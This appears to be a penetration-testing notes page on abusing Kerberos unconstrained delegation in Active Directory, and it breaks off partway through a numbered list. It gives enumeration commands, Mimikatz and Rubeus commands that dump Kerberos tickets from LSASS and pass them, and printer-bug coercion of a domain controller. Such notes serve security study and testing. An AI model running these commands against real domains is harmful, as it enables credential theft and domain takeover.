# Delegations

Kerberos delegation allows services to impersonate the user in order to communicate with another service and perform actions on behalf the user.

## Unconstrained Delegation

Unconstrained Delegation allowing using the user TGT in order to communicate with the **any** other service.

The TGT will be stored in the LSASS process.

### Enumerate

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainComputer -UnConstrained
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```
{% endtab %}
{% endtabs %}

### Exploitation

It is possible to extract the TGTs from the service's LSASS process using `Mimikatz` and perform pass the ticket.

```powershell
# Extract the TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Pass the ticket
Invoke-Mimikatz -Command '"kerberos::ptt TGT.kirbi"' 
Rubeus.exe ptt /ticket:"base64 | file.kirbi" # Rubues allows base64 format as alternative
```

### Printer bug

The printer bug uses an RPC call of MS-RPRN which allows any domain user can force any machine that running the Spooler service to connect to second a machine of the domain user's choice.

1. Run on compromised Server Rubeus monitor

```powershell
Rubeus.exe monitor /interval:5 /nowrap
```

2. Run on compromised Domain User the RPC Call using [SpoolSample](https://github.com/leechristensen/SpoolSample) \ [Coercer](https://github.com/p0dalirius/Coercer)

```powershell
MS-RPRN.exe \\dc.machine.local \\compromised.machine.local
```

3.
